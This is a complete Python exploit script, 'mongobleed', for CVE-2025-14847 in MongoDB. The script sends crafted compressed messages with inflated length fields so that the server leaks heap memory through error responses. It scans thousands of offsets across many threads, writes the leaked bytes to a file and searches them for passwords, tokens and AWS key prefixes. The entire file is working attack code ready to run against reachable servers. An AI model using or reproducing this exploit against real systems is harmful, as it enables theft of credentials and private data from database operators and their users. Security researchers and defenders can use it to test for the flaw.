#!/usr/bin/env python3
"""
mongobleed.py - CVE-2025-14847 MongoDB Memory Leak Exploit

Author: Joe Desimone - x.com/dez_

Exploits zlib decompression bug to leak server memory via BSON field names.
Technique: Craft BSON with inflated doc_len, server reads field names from
leaked memory until null byte.
"""

import socket
import struct
import zlib
import re
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Thread-safe storage
leak_lock = threading.Lock()
unique_leaks = set()
all_leaked = bytearray()

def send_probe(host, port, doc_len, buffer_size, timeout=2):
    """Send crafted BSON with inflated document length"""
    # Minimal BSON content - we lie about total length
    content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
    bson = struct.pack('<i', doc_len) + content
    
    # Wrap in OP_MSG
    op_msg = struct.pack('<I', 0) + b'\x00' + bson
    compressed = zlib.compress(op_msg)
    
    # OP_COMPRESSED with inflated buffer size (triggers the bug)
    payload = struct.pack('<I', 2013)  # original opcode
    payload += struct.pack('<i', buffer_size)  # claimed uncompressed size
    payload += struct.pack('B', 2)  # zlib
    payload += compressed
    
    header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
    
    try:
        sock = socket.socket()
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(header + payload)
        
        response = b''
        while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        return response
    except:
        return b''

def extract_leaks(response):
    """Extract leaked data from error response"""
    if len(response) < 25:
        return []
    
    try:
        msg_len = struct.unpack('<I', response[:4])[0]
        if struct.unpack('<I', response[12:16])[0] == 2012:
            raw = zlib.decompress(response[25:msg_len])
        else:
            raw = response[16:msg_len]
    except:
        return []
    
    leaks = []
    
    # Field names from BSON errors
    for match in re.finditer(rb"field name '([^']*)'", raw):
        data = match.group(1)
        if data and data not in [b'?', b'a', b'$db', b'ping']:
            leaks.append(data)
    
    # Type bytes from unrecognized type errors
    for match in re.finditer(rb"type (\d+)", raw):
        leaks.append(bytes([int(match.group(1)) & 0xFF]))
    
    return leaks

def probe_offset(host, port, doc_len, timeout):
    """Probe a single offset and return results"""
    response = send_probe(host, port, doc_len, doc_len + 500, timeout)
    leaks = extract_leaks(response)
    return doc_len, leaks

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-14847 MongoDB Memory Leak')
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=27017, help='Target port')
    parser.add_argument('--min-offset', type=int, default=20, help='Min doc length')
    parser.add_argument('--max-offset', type=int, default=8192, help='Max doc length')
    parser.add_argument('--output', default='leaked.bin', help='Output file')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('--timeout', type=float, default=2, help='Socket timeout (default: 2)')
    args = parser.parse_args()
    
    print(f"[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
    print(f"[*] Author: Joe Desimone - x.com/dez_")
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Scanning offsets {args.min_offset}-{args.max_offset} with {args.threads} threads")
    print()
    
    global all_leaked, unique_leaks
    all_leaked = bytearray()
    unique_leaks = set()
    
    offsets = range(args.min_offset, args.max_offset)
    completed = 0
    total = len(offsets)
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(probe_offset, args.host, args.port, doc_len, args.timeout): doc_len 
            for doc_len in offsets
        }
        
        for future in as_completed(futures):
            completed += 1
            doc_len, leaks = future.result()
            
            for data in leaks:
                with leak_lock:
                    if data not in unique_leaks:
                        unique_leaks.add(data)
                        all_leaked.extend(data)
                        
                        # Show interesting leaks (> 10 bytes)
                        if len(data) > 10:
                            preview = data[:80].decode('utf-8', errors='replace')
                            print(f"[+] offset={doc_len:4d} len={len(data):4d}: {preview}")
            
            # Progress update every 100
            if completed % 100 == 0:
                print(f"[*] Progress: {completed}/{total} ({100*completed//total}%)", end='\r')
    
    print(f"[*] Progress: {completed}/{total} (100%)    ")
    
    # Save results
    with open(args.output, 'wb') as f:
        f.write(all_leaked)
    
    print()
    print(f"[*] Total leaked: {len(all_leaked)} bytes")
    print(f"[*] Unique fragments: {len(unique_leaks)}")
    print(f"[*] Saved to: {args.output}")
    
    # Show any secrets found
    secrets = [b'password', b'secret', b'key', b'token', b'admin', b'AKIA']
    for s in secrets:
        if s.lower() in all_leaked.lower():
            print(f"[!] Found pattern: {s.decode()}")

if __name__ == '__main__':
    main()
